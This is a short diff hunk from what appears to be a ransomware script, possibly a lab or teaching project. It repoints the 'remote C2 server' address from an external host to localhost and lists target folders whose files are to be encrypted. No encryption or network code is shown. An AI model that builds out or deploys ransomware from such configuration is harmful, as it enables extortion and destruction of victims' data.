@@ -19,8 +19,7 @@ from time import sleep  # 😴
 
 # Variables
 # Address of the remote C2 server
-c2_url = "https://rnsm.uber.space"
-# c2_url = "http://localhost:5000"
+c2_url = "http://localhost:5000"
 # List of paths. Every file in these lcoations will be encrypted ...
 target_paths = [".\\toencrypt", ".\\toencrypt2"]
 # ..except for the filetypes defined in the following list
